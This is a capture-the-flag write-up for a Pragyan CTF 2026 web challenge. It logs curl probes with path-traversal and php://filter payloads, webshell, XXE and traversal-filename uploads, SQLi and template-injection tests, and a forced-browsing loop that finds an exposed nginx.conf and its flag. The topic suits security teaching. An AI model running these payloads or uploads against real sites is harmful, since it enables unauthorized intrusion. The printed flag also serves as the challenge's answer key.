# Domain Registrar

**CTF/platform:** Pragyan CTF 2026

**Category:** Web

**Difficulty:** Easy (rated Hard)

**Description:** This website looks like a good place to get a domain for my homelab, but this bloody KYC...

**Remote:** `https://domain-registrar.ctf.prgy.in/`

**Flag:** `p_ctf{c@n_nEVer_%ru$T_D0M@!nS_FR0m_p0Ps}`

## Description

> This website looks like a good place to get a domain for my homelab, but this bloody KYC...

## Reconnaissance

### Technology detected

```
Server: nginx
Content-Type: text/html (static pages served by nginx)
Backend: PHP (avlbl.php, kyc.php)
```

### Application map

```
index.html          → Main page, list domains
├── app.js          → Frontend JS (fetch domains, KYC upload, checkout redirect)
├── style.css       → Styles
├── avlbl.php       → API: list domains (action=get_domains) + hidden "list" parameter
├── kyc.html        → KYC form: name + ID photo (JPEG/PNG)
├── kyc.php         → Backend: processes image upload
├── checkout.html   → Purchase result (displays msg via query param)
└── nginx.conf      → ← FLAG HERE
```

### Step 1: Frontend inspection

`app.js` reveals backend endpoints:

```javascript
// Main endpoint for listing domains
fetch('avlbl.php?action=get_domains')

// Suspicious comment (decoy)
// const ep = "avlbl.php?list=

// KYC upload
fetch('kyc.php', { method: 'POST', body: formData })

// Checkout — injects msg directly into innerHTML (potential XSS, but irrelevant)
resultDiv.innerHTML = decodeURIComponent(msg);
```

### Step 2: Exploration of vectors (rabbit holes)

#### Rabbit hole 1: `list=` parameter in avlbl.php

The comment `// const ep = "avlbl.php?list=` suggests a hidden parameter. When testing it:

```bash
$ curl -s "https://domain-registrar.ctf.prgy.in/avlbl.php?list=all"
sus

$ curl -s "https://domain-registrar.ctf.prgy.in/avlbl.php?list=php://filter/convert.base64-encode/resource=avlbl"
sus
```

Any value returns `"sus"` — it's a honeypot/decoy designed to waste time. Tested with:
- Path traversal (`../etc/passwd`)
- PHP wrappers (`php://filter/...`)
- URL encoding, double encoding, null bytes
- Common values (`domains`, `users`, `all`, `flag`)

**Result**: Intentional dead end.

#### Rabbit hole 2: Webshell upload via KYC

The KYC form accepts **any file** without validation:

```bash
# Pure PHP with .php extension → accepts
$ curl -s -X POST .../kyc.php -F "fullname=x" -F "kyc_photo=@shell.php"
{"status":"success","message":"...Reference ID: VHDK7F"}

# SVG with XXE → accepts
$ curl -s -X POST .../kyc.php -F "fullname=x" -F "kyc_photo=@xxe.svg"
{"status":"success","message":"...Reference ID: 0L41LV"}

# Path traversal in filename → accepts
$ curl -s -X POST .../kyc.php -F "kyc_photo=@f;filename=../../../tmp/pwned.php"
{"status":"success","message":"...Reference ID: H47R83"}
```

Tested extensions: `.php`, `.phtml`, `.phar`, `.php5`, `.php7`, `.phps`, `.shtml`. Everything is accepted, but the upload directory **is not accessible** from the outside. Searched in:
`/uploads/`, `/upload/`, `/kyc/`, `/files/`, `/img/`, `/images/`, `/data/`, `/tmp/`, `/static/`, `/media/`

None exist (404). Reference IDs also don't work as paths.

**Result**: Files are saved outside webroot or in unpredictable location.

#### Rabbit hole 3: SQLi / SSTI in fullname

```bash
$ curl -s -X POST .../kyc.php -F "fullname=test' OR '1'='1" -F "kyc_photo=@img.jpg"
{"status":"success"...}   # No SQL error

$ curl -s -X POST .../kyc.php -F "fullname={{7*7}}" -F "kyc_photo=@img.jpg"
{"status":"success"...}   # No template evaluation
```

**Result**: No injection in fullname.

### Step 3: Enumeration of configuration files

Standard **forced browsing** / **file discovery** technique: test common files that may be exposed by mistake on the web server.

```bash
for f in .git/HEAD .git/config .gitignore config.php db.php admin.php \
         flag.php flag.txt info.php phpinfo.php .htaccess nginx.conf \
         Dockerfile docker-compose.yml composer.json package.json; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://domain-registrar.ctf.prgy.in/$f")
  if [ "$code" != "404" ]; then echo "[$code] /$f"; fi
done
```

```
[200] /nginx.conf
```

## Vulnerability

- **Type**: Configuration file exposure (Information Disclosure / Misconfiguration)
- **Root cause**: The `nginx.conf` file is accessible from the server webroot
- **Impact**: Flag leak (and potentially internal server configuration)
- **CWE**: [CWE-538](https://cwe.mitre.org/data/definitions/538.html) — Insertion of Sensitive Information into Externally-Accessible File or Directory

## Exploitation

```bash
$ curl -s https://domain-registrar.ctf.prgy.in/nginx.conf
"p_ctf{c@n_nEVer_%ru$T_D0M@!nS_FR0m_p0Ps}"
```

## Flag

```
p_ctf{c@n_nEVer_%ru$T_D0M@!nS_FR0m_p0Ps}
```

## Lessons Learned

- **Always do forced browsing of configuration files** before exploring complex vectors
- Minimum wordlist for web CTFs: `.git/HEAD`, `nginx.conf`, `.htaccess`, `Dockerfile`, `docker-compose.yml`, `config.php`, `.env`, `flag.txt`, `robots.txt`, `phpinfo.php`, `composer.json`, `package.json`
- "Hard" challenges sometimes have the simplest solution; the difficulty is in **not falling into rabbit holes** (KYC upload, `list=` parameter, SQLi/SSTI)
- If an endpoint accepts ANY input without complaining (like `kyc.php`), it's likely a decoy
- The name "GoPops" in the flag: `FR0m_p0Ps` → the hint was in the site name
